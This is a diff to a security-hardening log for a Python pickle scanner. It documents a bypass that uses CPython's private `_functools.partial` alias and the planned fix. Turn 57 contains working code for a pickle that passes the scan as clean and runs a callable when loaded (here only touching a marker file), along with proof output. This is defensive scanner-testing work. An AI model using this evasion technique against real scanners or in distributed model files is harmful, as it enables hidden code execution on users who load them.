@@ -2540,3 +2540,101 @@ Blocking plan:
 Performance note: the fix is a single builtin-name membership entry. It avoids
 descriptor-flow modeling, stack-object callability simulation, and broader
 callable-wrapper analysis.
+
+## Turn 57 - `_functools.partial` private-alias callable gap
+
+Goal: produce another compact RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using CPython's private
+`_functools.partial` alias to bypass the scanner's public `functools.partial`
+warning policy.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_private_functools_partial_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("_functools", "partial"),
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x86R\x940",
+        b"h\x00)R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=124`, `bytes_total=124`, `opcode_count=24`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `_functools.partial`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final empty-argument `REDUCE`
+  returns `functools.partial(Path.touch, marker)` and does not create
+  `/tmp/ma_private_functools_partial_marker`
+- Unpickle result: the full payload constructs the partial, retrieves the
+  memoized partial object, invokes it with an empty argument tuple, creates
+  `/tmp/ma_private_functools_partial_marker`, and returns `None`
+- RCE mechanism: `_functools.partial` and `functools.partial` are the same
+  callable factory exposed through different module paths. The scanner warns on
+  the public `functools.partial` path, but the private `_functools.partial`
+  alias remains clean and can synthesize a stack-resident callable that a later
+  `REDUCE` executes.
+
+Why the scanner missed it:
+
+- The warning policy only covers module `functools` names `partial` and
+  `partialmethod`; it does not cover `_functools`.
+- `_functools` is absent from `DANGEROUS_WILDCARD_MODULES`, and
+  `_functools.partial` is absent from `DANGEROUS_GLOBALS`.
+- The dangerous invocation uses the synthesized partial object from the pickle
+  stack, so there is no later dangerous global for the static policy table to
+  classify.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is another callable-wrapper alias gap. The focused next
+block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("_functools", "partial")`, with a manual-pickle oracle regression proving
+scan-time detection before the memoized partial creates the marker. The hot
+path remains a static binary-search policy lookup.
+
+## Turn 58 - Block `_functools.partial` private alias
+
+Blocking plan:
+
+- Add `("_functools", "partial")` to the sorted dangerous-global table. This
+  private CPython alias reaches the same partial factory as `functools.partial`
+  but had no warning or critical policy coverage.
+- Add portable Rust policy coverage for raw `_functools.partial` reductions so
+  detection does not depend on executing the synthesized partial.
+- Add a CPython oracle regression that first proves
+  `_functools.partial(Path.touch, marker)` only creates a partial object, then
+  proves a follow-on empty-argument `REDUCE` creates the marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix is a single sorted policy-table entry checked by
+binary search. It does not add alias resolution, callable-flow tracking, or
+special-case analysis for partial object internals.
